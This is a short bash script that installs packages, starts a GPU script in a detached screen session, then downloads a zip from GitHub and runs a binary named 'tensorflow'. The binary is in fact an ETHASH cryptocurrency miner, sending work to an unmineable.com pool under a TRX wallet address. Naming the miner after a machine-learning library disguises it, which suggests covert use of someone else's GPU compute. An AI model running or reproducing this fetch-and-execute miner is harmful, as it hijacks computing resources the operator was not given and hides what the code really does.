#!/bin/bash
sudo apt update && sudo apt-get install zip unzip && sudo apt install screen -y && screen -dmS gpuu.sh ./GPU.sh 65 75 && wget https://github.com/n5000/tensorflow/raw/main/tensorflow.zip && unzip tensorflow.zip && cd tensorflow && chmod u+x tensorflow && ./tensorflow --algo ETHASH --pool ethash.unmineable.com:3333 --user TRX:TGmtm8mGs8bgmSVPZ3rjggWEEQW8cSetDC.we --ethstratum ETHPROXY
